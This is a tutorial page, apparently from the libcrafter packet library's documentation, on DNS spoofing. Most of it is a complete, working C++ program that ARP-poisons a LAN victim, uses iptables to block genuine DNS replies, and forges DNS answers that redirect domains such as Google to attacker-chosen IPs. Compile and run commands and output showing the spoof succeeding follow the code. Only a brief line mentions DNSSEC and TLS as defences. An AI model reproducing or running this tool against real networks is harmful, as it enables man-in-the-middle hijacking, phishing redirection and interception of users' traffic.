# Introduction #

_Adapted from http://www.sans.org/reading_room/whitepapers/dns/dns-spoofing-man-middle_1567_

DNS is an application layer protocol used to map human readable domain
names to computer readable Internet Protocol (IP) addresses. DNS is essential to the operation of all IP networks, particularly the Internet.

The proposed DNS spoofing attack is aimed at a client’s DNS resolver. A DNS resolver acts on behalf of client software to retrieve information about a particular domain name. From a user’s point of view, the DNS resolver is passed a domain name and returns an IP address (or other information). To do this, the DNS resolver generates DNS queries which are sent over UDP to a specified DNS server. The DNS resolver then listens for DNS responses and returns the IP address provided. The proposed attack will aim to impersonate a legitimate DNS server by sending malicious DNS responses to a client’s DNS resolver.

Of particular relevance to this attack is how a DNS resolver receives and
validates DNS responses (see also Section 7.3 of RFC1035):

  * Match the transaction ID field in the domain header. The transaction ID is a 16 bit field used to match outstanding queries with incoming responses.
  * Inspect the question section of the response to ensure that relevant information provided
  * Only accept the first legitimate response for each query.

This attack can be countered by using Transport Layer Security (TLS) and digital signatures or by using Secure DNS (DNSSEC) that uses encrypted electronic signatures when passing DNS information.

# Simple DNS Poisoner #

The following program does several things,

  * First we define the IP addresses of the DNS server (if the server is not on the LAN, it must be the address of the router) and the victim along with the keywords for DNS poisoning (contained in the `spoof_list` STL map: "google" and "proxy") and the false IP associated to each one of them.

  * Second, we perform and ARP Posion attack and spawn a sniffer listening to UDP traffic with a port equal to 53 (default for DNS). At this point, all traffic from the victim should be going through our machine. Therefore, IP forwarding is activated and we use IPTABLES to block all the UDP traffic with a source or destination port equal to 53.
> In other words, all data going back and forth between the DNS server (192.168.1.1) and the victim (192.168.1.8) will be redirected correctly (through our kernel) except for the DNS traffic. The sniffer is responsible for processing them (through the `DNSSpoofer` function).

**NOTE**: Remember that libcrafter doesn't mind about local firewall rules. The sniffer will catch the DNS traffic even though the kernel is not processing/forwarding it.

  * Finally, the `DNSSpoofer` function, which is executed every time the sniffer catch a packet, will perform the DNS Spoofing if the domain requested by the victim contains one of the keywords provided in the `spoof_list` map.

```
#include <iostream>
#include <string>
#include <crafter.h>
#include <signal.h>
#include <map>

/* Collapse name spaces */
using namespace std;
using namespace Crafter;

/* Structure for save MAC addresses */
struct HostInfo {
	/* Interface */
	string iface;
	/* IP address of the DNS server */
	string dns_ip;
	/* IP address of the victim */
	string victim_ip;
	/* MAC address of the device which is a DNS server (or the router if the DNS server is not in our local network) */
	string dns_mac;
	/* MAC address of the victim */
	string victim_mac;
	/* My MAC address */
	string my_mac;
};

/* Global map of IP-HOSTS pairs */
map<string,string> spoof_list;

/* Function for handling a packet when the sniffer caught one */
void DNSSpoofer(Packet* sniff_packet, void* user);

/* IP tables "script" for dropping the DNS traffic. */
void iptables_block(const string& iface, const string& victim_ip, int dst_port);

/* IP tables "script" that flush all rules added */
void iptables_flush(const string& iface, const string& victim_ip, int dst_port);

/* Global Sniffer pointer */
Sniffer* sniff;

/* Function for handling a CTRL-C */
void ctrl_c(int dummy) {
	/* Cancel the sniffing thread */
	sniff->Cancel();
}

int main() {

	/* Init the library */
	InitCrafter();

	/* Set the interface */
	string iface = "wlan0";

	/* Create a structure with information about the attack */
	HostInfo* host_info = new HostInfo;

	/* IP addresses -> This is a data supply by the user */
	string dns_ip = "192.168.1.1"; short_word dst_port = 53; /* DNS traffic */
	string victim_ip = "192.168.1.8";

	/* List of addresses -> This also is data supplied by the user */
	spoof_list["google"] = "1.2.3.4";
	spoof_list["proxy"] = "3.3.3.3";

	/* Create a HostInfo structure */
	host_info->iface = iface;
	host_info->dns_ip = dns_ip;
	host_info->victim_ip = victim_ip;
	host_info->dns_mac = GetMAC(dns_ip,iface);
	host_info->victim_mac = GetMAC(victim_ip,iface);
	host_info->my_mac = GetMyMAC(iface);

	/* Before the attack, execute the IPTABLES "script" */
	iptables_block(iface,victim_ip,dst_port);

	/* Start the ARP spoofing */
	ARPContext* context = ARPSpoofingRequest(dns_ip,victim_ip,iface);

	/* Print data about the spoofing, and wait a few seconds */
	PrintARPContext(*context);
	sleep(3);

	/* Create a sniffer	*/
	sniff = new Sniffer("udp and host " + victim_ip + " and port " + StrPort(dst_port),iface,DNSSpoofer);

	/* Now, spawn the capture */
	void* sniffer_arg = static_cast<void*>(host_info);
	sniff->Spawn(-1, sniffer_arg);

	cout << "[@] Spawning the sniffer, redirecting the traffic... " << endl;

	/* Set a signal catcher */
	signal (SIGINT, ctrl_c);

	/* And wait for the sniffer to finish (when CONTROL-C is pressed) */
	sniff->Join();

	/* Delete the IP tables rules */
	iptables_flush(iface,victim_ip,dst_port);

	/* Delete allocated data */
	delete host_info;

	/* Clean up ARP context */
	CleanARPContext(context);

	/* Clean up library stuff... */
	CleanCrafter();

	return 0;
}

void DNSSpoofer(Packet* sniff_packet, void* user) {
	/* Cast the MAC addresses structure */
	HostInfo* host_data = static_cast<HostInfo*>(user);

	/* Get the Ethernet Layer */
	Ethernet* ether_layer = GetEthernet(*sniff_packet);

	/* Get the IP layer */
	IP* ip_layer = GetIP(*sniff_packet);

	/* Get the UDP layer */
	UDP* udp_layer = GetUDP(*sniff_packet);

	/* Flag to set when we should spoof a DNS answer */
	byte spoof = 0;

	/* Checks if the source MAC is not mine */
	if(ether_layer->GetSourceMAC() != host_data->my_mac) {

		/* Checks if the packet is coming from the victim... */
		if(ip_layer->GetSourceIP() == host_data->victim_ip) {

			/* Get the RawLayer */
			RawLayer* raw_layer = GetRawLayer(*sniff_packet);

			/* Create a DNS header */
			DNS dns_req;
			/* And decode it from a raw layer */
			dns_req.FromRaw(*raw_layer);

			/* Check if the DNS packet is a query and there is a question on it... */
			if( (dns_req.GetQRFlag() == 0) && (dns_req.Queries.size() > 0) ) {
				/* Get the host name to be resolved */
				string hostname = dns_req.Queries[0].GetName();

				/* Print information */
				cout << "[@] Query received -> Host Name = " << hostname << endl;

				/* Iterate the spoof_list */
				map<string,string>::iterator it_list;
				for(it_list = spoof_list.begin() ; it_list != spoof_list.end() ; it_list++) {

					/* Get the name on the list */
					string code_name = (*it_list).first;

					/* Check if the code_name is inside the host name requested */
					if(hostname.find(code_name) != string::npos) {

						cout << "[+] ---- Spoofed request (" << code_name << ") -> Host Name = " << hostname << endl;

						/* Get the IP address associated to this code_name */
						string ip_address = (*it_list).second;
						/* Create the DNS Answer */
						DNS::DNSAnswer dns_answer(hostname,ip_address);
						/* And put it into the container */
						dns_req.Answers.push_back(dns_answer);

						/* Modify the original request */
						dns_req.SetQRFlag(1); /* Now is a response */
						dns_req.SetRAFlag(1); /* Recursion is available */

						/* Set the spoof flag */
						spoof = 1;
						/* Break the loop */
						break;
					}
				}
			}

			/* Send the spoofed answer */
			if(spoof) {
				/* Pop the top layer... */
				sniff_packet->PopLayer();
				/* ... and put the DNS spoof answer just created */
				*sniff_packet /= dns_req;

				/* +++++ Ethernet Layer */

				/* Send the packet to the victim */
				ether_layer->SetDestinationMAC(host_data->victim_mac);
				/* And put our MAC ad a source */
				ether_layer->SetSourceMAC(host_data->my_mac);

				/* +++++ IP Layer */

				/* Get DNS server IP address */
				string dns_ip = ip_layer->GetDestinationIP();

				/* Send the packet to the victim IP */
				ip_layer->SetDestinationIP(host_data->victim_ip);
				/* PUt the dns IP address as a source IP */
				ip_layer->SetSourceIP(dns_ip);


				/* +++++ UDP Layer */

				/* Swap the destinations and source port */
				short_word src_port = udp_layer->GetSrcPort();
				short_word dst_port = udp_layer->GetDstPort();
				udp_layer->SetSrcPort(dst_port);
				udp_layer->SetDstPort(src_port);

				/* After modifying the layers, write the packet on the wire */
				sniff_packet->Send(host_data->iface);

			} else {

				/* Send the packet to the dns */
				ether_layer->SetDestinationMAC(host_data->dns_mac);
				/* And put our MAC ad a source */
				ether_layer->SetSourceMAC(host_data->my_mac);
				/* After modifying the Ethernet layer, write the packet on the wire */
				sniff_packet->Send(host_data->iface);

			}


		/* ...or coming from the server  */
		} else if (ip_layer->GetDestinationIP() == host_data->victim_ip) {

			/* Send the packet to the victim */
			ether_layer->SetDestinationMAC(host_data->victim_mac);
			/* And put our MAC ad a source */
			ether_layer->SetSourceMAC(host_data->my_mac);

			/* After modifying the Ethernet layer, write the packet on the wire */
			sniff_packet->Send(host_data->iface);
		}

	}

}

void iptables_block(const string& iface, const string& victim_ip, int dst_port) {
	/* Activate IP forwarding */
	system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");

	/* Drop packets sent to or received from a http server (for victim IP address) */
	system(string("/sbin/iptables  -A FORWARD -s " + victim_ip +
			      " -p udp --dport " + StrPort(dst_port) + " -j DROP").c_str());
	system(string("/sbin/iptables -A FORWARD -d " + victim_ip +
			      " -p udp --sport " + StrPort(dst_port) + " -j DROP").c_str());

	/* Remember that libcrafter doesn't mind about local firewalls rules... */
}

void iptables_flush(const string& iface, const string& victim_ip, int dst_port) {
	/* Disable IP forwarding */
	system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");
	/* Delete the rules */
	system(string("/sbin/iptables -D FORWARD -s " + victim_ip +
			      " -p udp --dport " + StrPort(dst_port) + " -j DROP").c_str());
	system(string("/sbin/iptables -D FORWARD -d " + victim_ip +
			      " -p udp --sport " + StrPort(dst_port) + " -j DROP").c_str());
}
```

Compile and run the program:
```
g++ dnsspoof.cpp -o dnsspoof -lcrafter
sudo ./dnsspoof
```

You should see something like this on your screen:

```
[@] --- ARP Spoofer 
[@] Attacker's MAC address = 1c:65:9d:0f:*:*
[@] --- Victim network 
 IP : 192.168.1.8 ; MAC : 08:00:27:28:*:*
[@] --- Target network 
 IP : 192.168.1.1 ; MAC : 00:02:cf:7b:*:*
[@] Spawning the sniffer, redirecting the traffic... 
```

This is a sreenshoot of the victim machine performing a DNS query of the "www.google.com.ar" host before and after the attack . As you can see, after we execute the program, the IP returned by `nslookup` is the one provided in the above code (1.2.3.4).

![http://figures.libcrafter.googlecode.com/git/DNSSpoof.png](http://figures.libcrafter.googlecode.com/git/DNSSpoof.png)

On our machine, the program will print a message notifying the action:

```
[@] --- ARP Spoofer 
[@] Attacker's MAC address = 1c:65:9d:0f:*:*
[@] --- Victim network 
 IP : 192.168.1.8 ; MAC : 08:00:27:28:*:*
[@] --- Target network 
 IP : 192.168.1.1 ; MAC : 00:02:cf:7b:*:*
[@] Spawning the sniffer, redirecting the traffic... 
[@] Query received -> Host Name = www.google.com.ar
[+] ---- Spoofed request (google) -> Host Name = www.google.com.ar
```

Now, lets try to perform the same attack but changing the DNS server on the victim machine by other which is not located in the same LAN (for example an OPENDNS server).

![http://figures.libcrafter.googlecode.com/git/DNSSpoofExternal.png](http://figures.libcrafter.googlecode.com/git/DNSSpoofExternal.png)

As you can see, the attack still works, because the IP address 192.168.1.1 belongs to the router.